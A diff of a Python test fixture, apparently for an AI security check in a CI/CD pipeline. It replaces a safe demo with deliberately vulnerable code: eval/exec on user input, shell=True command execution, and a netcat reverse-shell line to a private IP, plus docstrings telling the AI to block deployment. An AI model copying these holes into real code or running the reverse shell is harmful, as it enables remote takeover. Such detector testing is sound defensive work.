@@ -1,43 +1,41 @@
 #!/usr/bin/env python3
 """
-SAFE CODE - Security test passed.
+DANGEROUS CODE - Python vulnerabilities.
 
-This file demonstrates safe coding practices.
-AI should ALLOW deployment.
+This file contains dangerous Python patterns.
+AI should BLOCK deployment.
 """
 
-def safe_function():
-    """Safe function without vulnerabilities."""
-    print("This is a safe function")
-    return True
+import os
+import subprocess
 
 
-def process_data(data):
-    """Process data safely."""
-    if not data:
-        return None
-    
-    # Safe data processing
-    result = data.strip().lower()
+def dangerous_eval(user_input):
+    """DANGEROUS: Using eval() with user input."""
+    result = eval(user_input)
     return result
 
 
-def calculate_sum(numbers):
-    """Calculate sum of numbers safely."""
-    total = 0
-    for num in numbers:
-        if isinstance(num, (int, float)):
-            total += num
-    return total
+def dangerous_exec(user_code):
+    """DANGEROUS: Using exec() with user code."""
+    exec(user_code)
+
+
+def dangerous_os_system(command):
+    """DANGEROUS: Using os.system() for command execution."""
+    os.system(command)
+
+
+def dangerous_subprocess(cmd):
+    """DANGEROUS: Using subprocess without proper validation."""
+    subprocess.call(cmd, shell=True)
+
+
+def reverse_shell_attempt():
+    """DANGEROUS: Reverse shell attempt."""
+    os.system("nc -e /bin/bash 192.168.1.7 443")
 
 
 if __name__ == "__main__":
-    safe_function()
-    data = process_data("  HELLO WORLD  ")
-    print(f"Processed: {data}")
-    
-    numbers = [1, 2, 3, 4, 5]
-    total = calculate_sum(numbers)
-    print(f"Sum: {total}")
-    
-    print("✅ All tests passed - SAFE CODE, CI/CD DEMO")
+    print("⚠️ This code contains DANGEROUS patterns!")
+    print("❌ AI should BLOCK this deployment")
